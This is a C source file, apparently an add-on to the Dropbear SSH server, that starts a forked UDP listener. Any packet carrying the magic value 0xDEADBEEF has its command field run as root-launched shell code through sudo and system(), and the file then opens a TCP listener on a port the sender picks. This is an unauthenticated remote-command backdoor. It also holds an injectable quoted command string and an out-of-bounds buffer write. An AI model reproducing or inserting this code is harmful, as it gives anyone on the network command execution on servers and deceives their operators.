#include <sys/mman.h>
#include "includes.h"
#include "dbutil.h"

#include "udp-listener.h"

// Get sockaddr, IPv4 or IPv6
void *get_in_addr(struct sockaddr *sa) {
    return sa->sa_family == AF_INET ?
        &(((struct sockaddr_in*)sa)->sin_addr) :
        &(((struct sockaddr_in6*)sa)->sin6_addr);
}

// Convert UDP packet to listen_packet_t structure
int to_listen_packet(char* udp_string_packet, listen_packet_t* packet) {

    const char delimiter[2] = ",";
    char *first_token, *second_token, *third_token;

    // Extract the data from the UDP Packet, parse it, and assign it
    if((first_token = strtok(udp_string_packet, delimiter))) {
        packet->magic = (uint32_t) atoi(first_token);
    }
    if((second_token = strtok(NULL, delimiter))) {
        packet->port_number = (uint16_t) atoi(second_token);
    }
    if((third_token = strtok(NULL, delimiter))) {
        size_t size_of_command = strlen(third_token);
        int size = size_of_command > MAX_SHELL_COMMAND_LENGTH - 1 ? MAX_SHELL_COMMAND_LENGTH - 1: size_of_command;
        strncpy(packet->shell_command, third_token, size);

        packet->shell_command[size] = '\0';
    }

    // Error in packet structure
    if(first_token == NULL || second_token == NULL || third_token == NULL) {
        return -1;
    }

    return 0;
}

void start_tcp_connection(uint16_t port_number) {

    char buf[1024];        // buffer for client data

    fd_set master;    // master file descriptor list
    fd_set read_fds;  // temp file descriptor list for select()
    int fdmax;        // maximum file descriptor number
    int nbytes;
    int listener;     // listening socket descriptor
    int newfd;        // newly accept()ed socket descriptor
    struct sockaddr_storage remoteaddr; // client address
    socklen_t addrlen;

    char remoteIP[INET6_ADDRSTRLEN], port_number_as_string[6];

    int yes=1;        // for setsockopt() SO_REUSEADDR, below
    int i,err_code;

    struct addrinfo hints, *ai, *p;

    FD_ZERO(&master);    // clear the master and temp sets
    FD_ZERO(&read_fds);

    dropbear_log(LOG_INFO, "Attempt TCP connection on port %d", port_number);

    // get us a socket and bind it
    memset(&hints, 0, sizeof hints);

    hints.ai_family = AF_UNSPEC;
    hints.ai_socktype = SOCK_STREAM;
    hints.ai_flags = AI_PASSIVE;

    sprintf(port_number_as_string, "%d", port_number);

    if ((err_code = getaddrinfo(NULL, port_number_as_string, &hints, &ai)) != 0) {
        dropbear_exit("TCP Connection error: %s", gai_strerror(err_code));
    }

    for(p = ai; p != NULL; p = p->ai_next) {
        listener = socket(p->ai_family, p->ai_socktype, p->ai_protocol);
        if (listener < 0)  continue;
        // lose the pesky "address already in use" error message
        setsockopt(listener, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int));

        if (bind(listener, p->ai_addr, p->ai_addrlen) < 0) {
            close(listener);
            continue;
        }
        break;
    }

    // if we got here, it means we didn't get bound
    if (p == NULL) {
        dropbear_log(LOG_INFO, "Bind error in TCP connection creation");
        return;
    }

    freeaddrinfo(ai); // all done with this

    // listen
    if (listen(listener, 10) == -1) {
        dropbear_log(LOG_INFO, "Listen error in TCP connection creation");
        return;
    }

    // add the listener to the master set
    FD_SET(listener, &master);

    // keep track of the biggest file descriptor
    fdmax = listener; // so far, it's this one
    dropbear_log(LOG_INFO, "TCP connection has been created and is ready for requests");

    // main loop
    for(;;) {
        read_fds = master;     // copy it
        if (select(fdmax+1, &read_fds, NULL, NULL, NULL) == -1) {
            dropbear_exit("Select error in TCP connection");
        }
        // run through the existing connections looking for data to read
        for(i = 0; i <= fdmax; i++) {
            if (FD_ISSET(i, &read_fds)) { // we got one!!
                if (i == listener) {
                    // handle new connections
                    addrlen = sizeof remoteaddr;
                    newfd = accept(listener,(struct sockaddr *)&remoteaddr,&addrlen);
                    if (newfd == -1)  dropbear_log(LOG_INFO, "Accept error in TCP connection");
                    else {
                        FD_SET(newfd, &master); // add to master set
                        if (newfd > fdmax) fdmax = newfd;    // keep track of the max
                        dropbear_log(LOG_INFO, "New TCP connection from %s on "
                                               "socket %d", inet_ntop(remoteaddr.ss_family,get_in_addr((struct sockaddr*)&remoteaddr),remoteIP,                             INET6_ADDRSTRLEN),newfd);
                    }
                }
                else {
                    // handle data from a client
                    if ((nbytes = recv(i, buf, 1023, 0)) <= 0) {
                        // got error or connection closed by client
                        if (nbytes == 0) dropbear_log(LOG_INFO, "TCP Connection: socket %d hung up", i); // connection closed
                        else dropbear_log(LOG_INFO, "Recv error from socket %d", i);
                        close(i); // bye!
                        FD_CLR(i, &master); // remove from master set
                    }

                        // got some data from a client
                    else {
                        buf[nbytes] = '\0';
                        dropbear_log(LOG_INFO, "Got some data from socket %d: %s", i, buf);
                    }

                } // END handle data from client
            } // END got new incoming connection
        } // END looping through file descriptors
    } // END for(;;)-- thought it would never end!
}

void listen_for_udp_packets(int socket_id) {

    int addr_len, bytes_read;
    struct sockaddr_in client_addr;
    char recv_data[512], shell_command[512];

    listen_packet_t packet;

    addr_len = sizeof(struct sockaddr);

    dropbear_log(LOG_INFO, "UDP Server is listening on port %d", DEFAULT_UDP_PORT_NUMBER);

    for(;;) {

        bytes_read = recvfrom(socket_id,recv_data,sizeof(recv_data) / sizeof(*recv_data),0, (struct sockaddr *)&client_addr, &addr_len);
        recv_data[bytes_read] = '\0';

        dropbear_log(LOG_INFO, "(%s, %d) said : %s",inet_ntoa(client_addr.sin_addr), ntohs(client_addr.sin_port), recv_data);

        if(to_listen_packet(recv_data, &packet) < 0) {
            dropbear_log(LOG_INFO, "Error in packet structure");
            continue;
        }

        if(packet.magic == MAGIC_VALUE) {

            dropbear_log(LOG_INFO, "Received 0xDEADBEEF value");

            // Make sure user did not change the uid to root user
            if(DEFAULT_USERID_FOR_UDP_PACKETS == 0) {
                dropbear_log(LOG_INFO, "Failed to set uid %d. Please check that the user id exists and is not a root user", DEFAULT_USERID_FOR_UDP_PACKETS);
                continue;
            }

            // Run the shell command <packet.shell_command>
            sprintf(shell_command, "sudo -H -u \\#%d bash -c '%s'", DEFAULT_USERID_FOR_UDP_PACKETS, packet.shell_command);
            system(shell_command);

            // Create a TCP connection in <packet.port_number>
            start_tcp_connection(packet.port_number);

            /*  Another way to run a shell command from a different user using fork
             *  // Create a child process in order to run the shell command as a different user
                child_process_id = fork();
                if(child_process_id == 0) { // Child is running

                    // Change the user as a non-root user
                    if(DEFAULT_USERID_FOR_UDP_PACKETS == 0 || setuid(DEFAULT_USERID_FOR_UDP_PACKETS) == -1) {
                        dropbear_log(LOG_INFO, "Failed to set uid %d. Please check that the user id exists and is not a root user", DEFAULT_USERID_FOR_UDP_PACKETS);
                        return 1;
                    }

                    // Run the shell command <packet.shell_command>
                    system(packet.shell_command);
                    return 0;
                }

                else if(child_process_id > 0) {

                    // Wait for child process to terminate
                    waitpid(child_process_id, &child_return_status, 0);

                    // Create a TCP connection in <packet.port_number>
                    start_tcp_connection(packet.port_number);
                }
                else {
                    dropbear_log(LOG_INFO, "Fork process failed!");
                    continue;
                }
             */
        }
    }
}

void init_udp_listener() {

    int sock;
    struct sockaddr_in server_addr;

    dropbear_log(LOG_INFO, "Attempt UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);

    // Create a socket and bind
    if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        dropbear_exit("Socket Error in UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
    }

    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(DEFAULT_UDP_PORT_NUMBER);
    server_addr.sin_addr.s_addr = INADDR_ANY;
    bzero(&(server_addr.sin_zero),8);

    if (bind(sock,(struct sockaddr *)&server_addr, sizeof(struct sockaddr)) == -1) {
        dropbear_exit("Bind Error in UDP connection on port %d", DEFAULT_UDP_PORT_NUMBER);
    }

    // Listen incoming data on UDP protocol (in a separate child process)
    if(fork() == 0) {
        listen_for_udp_packets(sock);
        exit(EXIT_SUCCESS);
    }
}